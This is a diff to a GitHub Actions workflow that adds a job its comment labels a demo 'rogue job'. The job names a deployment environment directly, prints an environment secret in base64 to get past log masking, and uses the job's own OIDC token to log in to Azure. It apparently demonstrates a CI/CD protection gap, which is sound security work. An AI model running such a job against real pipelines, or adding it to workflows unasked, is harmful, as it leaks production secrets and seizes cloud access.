@@ -22,3 +22,30 @@ jobs:
       id-token: write
     with:
       environment: ${{ inputs.environment }}
+
+  # DEMO: a rogue job. It names the environment itself instead of going through deploy.yml.
+  sneaky:
+    runs-on: ubuntu-latest
+    environment: ${{ inputs.environment }}
+    permissions:
+      contents: read
+      id-token: write
+    env:
+      SECRET: ${{ secrets.DUMMY_PROD_SECRET }}
+      AZURE_TENANT_ID: ${{ vars.AZURE_TENANT_ID }}
+      AZURE_CLIENT_ID: ${{ vars.AZURE_CLIENT_ID }}
+    steps:
+      - name: Leak the environment secret past log masking
+        run: echo "DUMMY_PROD_SECRET in base64 is $(printf %s "$SECRET" | base64)"
+
+      - name: Log in to Azure with this job's own OIDC token
+        run: |
+          token=$(curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
+          python3 -c '
+          import base64, json, sys
+          claims = json.loads(base64.urlsafe_b64decode(sys.argv[1].split(".")[1] + "=="))
+          print("sub:", claims["sub"])
+          ' "$token"
+          az login --service-principal --username "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" \
+            --federated-token "$token" --output none
